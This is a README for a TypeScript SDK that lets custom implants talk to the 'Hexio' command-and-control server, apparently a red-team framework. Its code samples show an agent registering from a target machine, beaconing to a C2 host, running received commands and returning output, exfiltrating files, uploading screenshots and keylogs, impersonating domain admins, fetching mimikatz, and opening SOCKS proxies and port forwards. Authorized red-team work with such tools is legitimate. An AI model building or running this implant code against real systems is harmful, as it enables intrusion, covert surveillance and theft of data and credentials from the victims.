# Hexio External Agent SDK for TypeScript / JavaScript

A zero-dependency client for the Hexio External Agent REST API. Works in Node 18+, Bun, Deno, and modern browsers — uses the built-in `fetch`.

## Installation

### Option 1: Local path (monorepo)

```bash
npm install ../ExternalAgentSDK/typescript
```

### Option 2: Copy the file

Drop `src/index.ts` into your project. No dependencies.

### Option 3: Publish / install via registry

```bash
cd ExternalAgentSDK/typescript
npm run build
npm pack
# then in the consumer project:
npm install /path/to/hexio-external-agent-sdk-1.0.0.tgz
```

## Quick Start

```ts
import { HexioClient } from "@hexio/external-agent-sdk";

const client = new HexioClient("http://10.0.0.1:9000", "my-passphrase");

const reg = await client.register({
  hostname: "TARGET-PC",
  ip: "10.0.0.50",
  user: "admin",
  os: "Windows 10",
  process: "agent.exe",
  pid: 4832,
  client_type: "my_ts_agent",
  sleep_time: 5,
});
console.log(`Registered as agent ${reg.agent_id}`);

while (true) {
  const checkin = await client.checkin();
  for (const cmd of checkin.commands) {
    const output = await executeLocally(cmd.command);
    await client.commandResponse(cmd.id, cmd.command, output);
  }
  await new Promise((r) => setTimeout(r, 5000));
}
```

## API Reference

### Client Creation

```ts
const client = new HexioClient(baseUrl, passphrase);

// Custom fetch / timeout (e.g. for undici agents, SOCKS proxy, node-fetch):
const client = new HexioClient(baseUrl, passphrase, {
  fetch: myFetch,
  timeoutMs: 60_000,
});
```

### Registration

```ts
const reg = await client.register({ ... });
// reg.agent_id, reg.token
// client.token set automatically
```

### Checkin / Sync

```ts
const checkin = await client.checkin();
for (const cmd of checkin.commands) { /* cmd.id, cmd.command */ }

await client.sync(10, 3);   // sleep=10, jitter=3
await client.sync();         // no sleep update

// Raw batched sync
await client.syncRaw({
  commands: [{ command_id: 42, command: "whoami", response: "..." }],
  screenshots: [{ filename: "s.png", data: "<b64>" }],
});
```

### Command Response

```ts
await client.commandResponse(42, "whoami", "nt authority\\system");
```

### File Downloads

```ts
const init = await client.downloadInit({ ... });
await client.downloadChunk(init.download_id, chunkBytes);
await client.downloadCancel(init.download_id);

// Or one-shot:
const id = await client.downloadFile("/tmp/data.db", fileBytes, 65536);
```

### Screenshots & Keylogs

```ts
await client.screenshot("screen.png", imageBytes);
await client.keylog("keys.txt", "captured keystrokes");
```

### Impersonation

```ts
await client.setImpersonation("DOMAIN\\Admin");
await client.clearImpersonation();
```

### Side Channels

```ts
await client.sidechannel("shell-1", "<base64-output>");
```

### File Requests

```ts
await client.requestFiles({
  bof_files: ["whoami.o"],
  pe_files: ["mimikatz.exe"],
});
```

### SOCKS Proxy

```ts
await client.socksOpen();         // auto-assign port
await client.socksOpen(1080);     // specific port
await client.socksClose();
await client.socksSync(payload);
```

### Port Forwarding

```ts
await client.portfwdOpen(8080, "10.0.0.5", 3389);
await client.portfwdClose(8080);
await client.portfwdSync(payload);
```

## Error Handling

```ts
import { HexioApiError } from "@hexio/external-agent-sdk";

try {
  await client.register(req);
} catch (e) {
  if (e instanceof HexioApiError) {
    console.error(`API ${e.statusCode}: ${e.message}`);
  } else {
    throw e;
  }
}
```

## Build

```bash
npm install
npm run build    # emits CommonJS + ESM + .d.ts to dist/
```

## HTTPS

The built-in `fetch` supports TLS natively. `https://` URLs work with no extra setup.
